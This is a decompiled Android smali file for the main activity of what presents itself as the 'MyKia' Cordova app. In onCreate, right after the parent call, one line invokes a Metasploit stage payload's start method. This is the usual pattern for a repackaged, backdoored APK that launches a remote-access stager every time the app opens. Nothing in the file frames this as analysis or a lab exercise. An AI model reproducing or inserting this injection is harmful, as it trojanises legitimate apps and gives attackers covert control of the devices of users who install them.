.class public Lcom/kia/eu/mykia/MainActivity;
.super Lorg/apache/cordova/CordovaActivity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 25
    invoke-direct {p0}, Lorg/apache/cordova/CordovaActivity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 2

    .line 30
    invoke-super {p0, p1}, Lorg/apache/cordova/CordovaActivity;->onCreate(Landroid/os/Bundle;)V
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
    .line 33
    invoke-virtual {p0}, Lcom/kia/eu/mykia/MainActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    if-eqz p1, :cond_0

    const/4 v0, 0x0

    const-string v1, "cdvStartInBackground"

    .line 34
    invoke-virtual {p1, v1, v0}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x1

    .line 35
    invoke-virtual {p0, p1}, Lcom/kia/eu/mykia/MainActivity;->moveTaskToBack(Z)Z

    .line 39
    :cond_0
    iget-object p1, p0, Lcom/kia/eu/mykia/MainActivity;->launchUrl:Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/kia/eu/mykia/MainActivity;->loadUrl(Ljava/lang/String;)V

    return-void
.end method
